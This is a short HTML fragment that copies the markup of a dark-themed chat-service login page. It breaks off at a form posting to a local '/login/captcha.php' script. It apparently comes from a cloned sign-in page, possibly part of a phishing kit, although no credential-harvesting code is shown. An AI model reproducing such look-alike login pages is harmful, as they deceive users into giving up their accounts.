...
<body>
    <div id="app-mount" class="appMount-3lHmkl">
        <div class="app-1q1i1E">
            <div class="characterBackground-2itjYF"><img style="position: fixed; height: 100%; top: 0; left: 0; width: 100%;" src="source/img/44e0c1fbcf99c4476083442e4a2774e0.svg"> <a href="/" target="_blank" rel="noopener" class="logo-2iEHEq logo-1-AbdC" style="opacity: 1; transform: translateY(0px) translateZ(0px);"></a></div>
                        ...
                        <div class="pole2x">
                            <div class="authBox-hW6HRx theme-dark">
                                <div class="centeringWrapper-2Rs1dR">
                                    <img alt="" src="source/img/0f4d1ff76624bb45a3fee4189279ee92.svg" class="marginBottom20-32qID7">
                                    ...
                                    <div class="flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs" style="flex: 1 1 auto;">
                                        ...
                                        <div>
                                            <form id="captchaxxx" method="POST" action="/login/captcha.php">
